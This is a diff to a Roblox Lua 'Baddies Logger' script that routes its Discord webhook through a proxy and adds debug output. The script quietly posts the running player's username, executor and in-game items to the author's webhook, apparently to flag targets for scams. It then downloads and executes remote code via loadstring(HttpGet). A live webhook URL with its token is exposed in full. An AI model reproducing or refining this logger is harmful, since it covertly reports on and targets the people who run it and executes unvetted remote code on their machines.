@@ -1,13 +1,15 @@
--- Advanced Baddies Logger (Rich Embed like Spidey Bot)
+-- Final Rich Logger with Proxy + Debug
 
-_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
+_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
 
 _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames
 
 _G.PING_POOR = true
 
--- Advanced Rich Embed Logger
+print("=== BADDIES LOGGER STARTED ===")
+
 task.spawn(function()
+    print("Ping task started...")
     if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
         local http = game:GetService("HttpService")
         local plr = game.Players.LocalPlayer
@@ -21,7 +23,6 @@ task.spawn(function()
                 fields = {
                     {name = "Username", value = plr.Name, inline = true},
                     {name = "Executor", value = identifyexecutor and identifyexecutor() or "Delta", inline = true},
-                    {name = "Game", value = "Baddies", inline = true},
                     {name = "Time", value = os.date("%X"), inline = true},
                     {name = "Base Weapons", value = "1 punches | Wallet | Phone | TradeSign | Spray", inline = false},
                     {name = "Main Weapons", value = "Parasol\nSpearhead Stick\nSlingshot", inline = false},
@@ -32,11 +33,22 @@ task.spawn(function()
             }}
         }
         
-        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
+        print("Sending rich embed to Discord...")
+        local success, err = pcall(function()
+            game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
+        end)
+        
+        if success then
+            print("✅ PING SENT SUCCESSFULLY!")
+        else
+            print("❌ PING FAILED: " .. tostring(err))
+        end
     end
 end)
 
--- Load the GUI
+-- Load GUI
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
 end)
+
+print("=== LOADER FINISHED ===")
